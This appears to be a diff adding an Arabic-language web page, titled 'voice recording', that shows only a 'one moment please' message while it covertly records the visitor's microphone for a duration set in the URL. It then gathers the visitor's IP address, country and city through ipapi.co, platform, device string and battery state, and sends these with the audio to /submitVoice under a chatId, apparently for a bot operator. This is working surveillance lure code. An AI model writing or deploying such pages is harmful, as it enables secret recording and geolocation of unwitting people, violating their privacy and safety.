@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل صوت</title>
+</head>
+<body>
+    <div id="notification">لحظة واحدة من فضلك...</div>
+
+    <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
+        <input type="hidden" name="chatId" id="chatId">
+        <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
+    </form>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('notification').textContent = 'لحظه واحدة من فضلك...';
+
+            const chatId = new URLSearchParams(window.location.search).get('chatId');
+            const duration = new URLSearchParams(window.location.search).get('duration');
+            document.getElementById('chatId').value = chatId;
+
+            startRecording(duration);
+        });
+
+        async function startRecording(recordDuration) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    document.getElementById('notification').textContent = 'تم إيقاف التسجيل، جاري الإرسال...';
+                }, recordDuration * 1000);
+
+                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                    const formData = new FormData(document.getElementById('voice-form'));
+                    formData.set('voice', audioBlob, 'voice.ogg');
+
+                    const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+                    const platformInfo = getPlatformInfo();
+                    const batteryInfo = await navigator.getBattery().then(battery => ({
+                        batteryLevel: battery.level,
+                        batteryCharging: battery.charging,
+                    }));
+
+                    const additionalData = {
+                        ip: ipInfo.ip,
+                        country: ipInfo.country_name,
+                        city: ipInfo.city,
+                        platform: platformInfo.platform,
+                        deviceVersion: getDeviceVersion(),
+                        batteryLevel: batteryInfo.batteryLevel,
+                        batteryCharging: batteryInfo.batteryCharging,
+                    };
+
+                    formData.append('additionalData', JSON.stringify(additionalData));
+
+                    try {
+                        const response = await fetch('/submitVoice', {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (!response.ok) throw new Error('Network response was not ok');
+                        document.getElementById('notification').textContent = 'تم إرسال التسجيل الصوتي والبيانات بنجاح';
+                    } catch (error) {
+                        document.getElementById('notification').textContent = 'حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات';
+                    }
+                };
+            } catch (error) {
+                document.getElementById('notification').textContent = 'خطأ في الوصول إلى الميكروفون';
+            }
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+    </script>
+</body>
+</html>
